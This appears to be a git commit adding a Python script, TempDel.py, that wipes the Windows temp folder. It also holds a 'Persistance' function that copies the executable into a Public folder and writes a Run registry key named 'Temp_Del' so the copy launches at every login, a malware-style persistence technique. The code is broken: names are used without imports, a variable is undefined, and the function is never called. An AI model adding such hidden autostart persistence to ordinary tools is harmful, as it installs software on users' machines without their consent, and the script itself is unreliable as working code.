33cb8dfec5f61bebe934d23e12dbce1bcbce2eb2
Justin Avina <jt.avina@icloud.com>
2022-05-15 02:48:43 -0700

    Initial Commit

---
+++ TempDel.py
@@ -0,0 +1,18 @@
+import os, shutil, subprocess
+
+def Persistance():
+    Download_Dir = os.environ["Public"] + "\\Del_Temp"
+    chdir(Download_Dir)
+    shutil.copyfile(sys.executable, Download_Dir)
+    
+    if not os.path.exists(Malocation):
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Temp_Del /t REG_SZ /d "' + Download_Dir + '"', shell=True)
+
+dir = os.environ["temp"]
+
+for files in os.listdir(dir):
+    path = os.path.join(dir, files)
+    try:
+        shutil.rmtree(path)
+    except OSError:
+        os.remove(path)
